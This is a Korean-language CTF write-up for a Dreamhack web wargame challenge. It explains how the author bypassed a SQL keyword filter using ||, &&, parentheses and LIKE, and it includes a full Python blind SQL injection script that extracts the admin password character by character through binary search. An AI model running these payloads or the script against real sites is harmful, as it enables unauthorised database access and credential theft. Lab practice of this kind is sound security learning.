created: 2026-01-28 23:23
category: #web 
link: https://dreamhack.io/wargame/challenges/416

# Write-up
```python
keywords = [
    "union",
    "select",
    "from",
    "and",  # &&
    "or",  # ||
    "admin",
    " ",  # ()
    "*",
    "/",
    "\n",
    "\r",
    "\t",
    "\x0b",
    "\x0c",
    "-",
    "+",
]
```
- 필터링 키워드들은 위와 같다. 따라서 `select`와 `union`을 쓰기가 어렵다고 느껴졌다. 
- 아무리 생각해봐도 boolean 베이스로 한 글자씩 찾는 방법밖에 없었다. 

우선 `and`와 `or`는 `&&`와 `||`로 대체할 수 있다. 그리고 LIKE 문법은 필터링되지 않으므로 다음과 같은 쿼리를 보냈다.
`asdf'||(uid)like'admi%'#`
- "admin" 그리고 공백 문자는 필터링되므로 위와 같이 LIKE 문법과 괄호를 적절히 사용하여 쿼리를 보낼 수 있었다. 
- 화면에서는 그냥 "admin"이 출력되었다. `upw`가 아니라 `uid`를 출력한다. (이 점 때문에 처음에는 `UNION`을 사용하는 걸 고려해보았지만 쉽지 않았다.)
- `asdf'uni%00on(se%00lect(upw)FR%00OM(users)WHERE(uid)LIKE'admi%')#`
	- 이렇게 넣어도 잘 통하지 않았다.
- 공백 대신에 괄호를 쓸 땐 위와 같이 column에 해당되는 곳에 괄호를 써주면 되는 듯 하다.

이제 SQL injection이 되는 것을 확인했으므로 한 글자씩 뽑아서 아스키 문자들로 대조 해야겠다고 생각했다. 

```python
import asyncio
import aiohttp

# URL = "http://localhost:8000/"  # 실제 주소로 수정
URL = "http://host3.dreamhack.games:13686/"


async def check(session, pos, mid):
    # 페이로드 구성 (공백 없이 괄호 활용)
    payload = f"test'||(uid)LIKE'admi_'&&ascii(substr(upw,{pos},1))>{mid}#"

    async with session.get(URL, params={"uid": payload}) as resp:
        text = await resp.text()
        # 응답 화면에 'admin'이 포함되어 있으면 True
        return "admin" in text


async def solve():
    password = ""
    async with aiohttp.ClientSession() as session:
        i = 0
        while True:
            i += 1
            low = 32
            high = 126  # 일반 ASCII 범위 

            # 해당 자리에 문자가 있는지 확인 (없으면 종료)
            if not await check(session, i, 0):
                break

            while low <= high:
                mid = (low + high) // 2
				# 해당 문자의 아스키 코드 값이 mid보다 높을 때
                if await check(session, i, mid):
                    low = mid + 1
                else:
                    high = mid - 1

            char = chr(low)
            password += char
            print(f"{i}번째 글자: {char} (현재: {password})")

    print(f"최종 비밀번호: {password}")


if __name__ == "__main__":
    asyncio.run(solve())
```
- `test'||(uid)LIKE'admi_'&&ascii(substr(upw,{pos},1))>{mid}#` 전달할 쿼리는 이렇다. 
	- "test"는 없는 계정이다. 따라서 `(uid)LIKE'admi_'`에 의해 일단 "admin" 계정의 row를 찾게 될 것이다. 
	- `ascii(substr(upw,{pos},1))>{mid}` 여기서 `ORD` 함수가 아니라 `ASCII` 함수를 사용했다. `ORD` 함수는 필터링 키워드에서 "or" 때문에 필터링에 걸렸었다.
	- 어쨋든 "admin" 계정의 `upw`를 뽑아서 첫 번째 자리부터 한 글자씩 뽑고, ASCII 넘버를 뽑는다. 그리고 [[blind sql injection advanced]]에서 다뤘던 것처럼, 이진 탐색을 이용하였다. 
- 해당 exploit 코드를 실행하여 정상적으로 플래그를 획득할 수 있었다.

ps. 플래그 형식을 예측하여 푸는 방법도 중요한 것 같다.

# Reference
- https://hg2lee.tistory.com/entry/SQL-Injection-filtering-Bypass
- https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/BasicObfuscation.wiki
- https://bactoria.tistory.com/entry/MySQL-like%EB%AC%B8-%ED%8A%B9%EC%A0%95-%EB%AC%B8%EC%9E%90-%ED%8F%AC%ED%95%A8%EB%90%98%EC%96%B4%EC%9E%88%EB%8A%94%EC%A7%80-%EA%B2%80%EC%83%89